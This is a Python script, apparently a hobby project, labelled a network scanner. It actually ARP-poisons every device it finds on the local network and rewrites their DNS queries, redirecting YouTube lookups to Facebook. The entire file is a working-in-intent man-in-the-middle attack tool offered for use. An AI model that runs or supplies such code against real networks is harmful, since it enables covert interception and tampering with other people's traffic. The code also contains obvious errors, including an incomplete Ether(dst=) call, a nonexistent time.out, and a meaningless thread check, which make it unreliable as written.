import scapy.all as scapy
import time
import netifaces
import ipaddress
import socket
import _thread

class NetworkScanner:
    def __init__(self):
        self.target_web = b'www.youtube.com'
        self.new_web = b'www.facebook.com'
        self.my_ip = self.get_ip_address()
        self.my_mac = self.get_mac(self.my_ip)
        self.gateway_ip = self.get_default_gateway()
        self.router_mac = self.get_mac(self.gateway_ip)
        self.subnet_mask = "255.255.248.0"
        self.cidr_notation = self.calculate_cidr_notation(self.gateway_ip)

    def get_ip_address(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            s.close()
            return ip_address
        except socket.error:
            return "Could not get IP address"

    def get_mac(self, ip):
        #arp_request = scapy.ARP(pdst=ip)
        #broadcast =
        arp_request_broadcast = scapy.ARP(pdst=ip) / scapy.Ether(dst=)
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        try:
            return answered_list[0][1].hwsrc
        except Exception as e:
            return f"An error occurred: {e}"

    def discover_devices(self, ip_range):
        arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip_range)
        result = scapy.srp(arp_request, timeout=15, verbose=0)[0]
        devices = []
        for sent, received in result:
            devices.append(received.psrc)
            print(f"IP: {received.psrc}, MAC: {received.hwsrc}")
        return devices

    def spoof(self, target_ip, spoof_ip):
        target_mac = self.get_mac(target_ip)
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

    def restore(self, destination_ip, source_ip):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

    def get_default_gateway(self):
        try:
            gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
            Router_IP = gateway
            print("Your router's IP address is: " + Router_IP)
            return Router_IP
        except KeyError:
            return "Default gateway not found"
        except Exception as e:
            return f"An error occurred: {e}"

    def calculate_cidr_notation(self, router_ip):
        router_ip_numeric = sum(int(octet) * (256 ** (3 - i)) for i, octet in enumerate(router_ip.split('.')))
        subnet_mask_numeric = sum(int(octet) * (256 ** (3 - i)) for i, octet in enumerate(self.subnet_mask.split('.')))
        starting_ip_numeric = router_ip_numeric & (subnet_mask_numeric | ~subnet_mask_numeric)
        subnet_bits = bin(subnet_mask_numeric).count('1')
        cidr_notation = f"{router_ip}/{subnet_bits}"
        print("Your CIDR is: " + cidr_notation)
        return cidr_notation

    def thread_ing(self, target_ip):
        while True:
            self.spoof(target_ip, self.gateway_ip)
            self.spoof(self.gateway_ip, target_ip)
            if time.sleep(40):
                break

    def i_filter(self, pack):
        return scapy.DNS in pack and scapy.DNSQR in pack

    def modify(self, pack):
        if pack[scapy.DNSQR].qname == self.target_web:
            print(pack)
        pack[scapy.DNSQR].qname = self.new_web
        pack[scapy.Ether].hwdst = self.router_mac
        scapy.send(pack, verbose=False)

    def sniffing(self, target_ip):
        while True:
            scapy.sniff(lfilter=self.i_filter, prn=self.modify)
            if time.out(40):
                break

    def run(self):
        try:
            packets_sent_count = 0
            while True:
                if _thread is open:
                    _thread.exit()
                if "/" not in self.cidr_notation:
                    print("Invalid IP range format. Please use CIDR notation (e.g., '192.168.1.0/24')")
                else:
                    discovered_devices = self.discover_devices(self.cidr_notation)
                    if self.my_ip in discovered_devices:
                        discovered_devices.remove(self.my_ip)
                    if self.gateway_ip in discovered_devices:
                        discovered_devices.remove(self.gateway_ip)
                    print(f"\nDiscovered {len(discovered_devices)} devices on the network.")
                k = len(discovered_devices) - 1
                while k != -1:
                    _thread.start_new_thread(self.thread_ing, (discovered_devices[k],))
                    _thread.start_new_thread(self.sniffing, (discovered_devices[k],))
                    k -= 1
                time.sleep(20)

        except KeyboardInterrupt:
            print("\n[+] Detected CTRL + C ... Resetting ARP tables ...")
            self.restore(discovered_devices[k], self.gateway_ip)
            self.restore(self.gateway_ip, discovered_devices[k])

# Usage
if __name__ == "__main__":
    scanner = NetworkScanner()
    scanner.run()
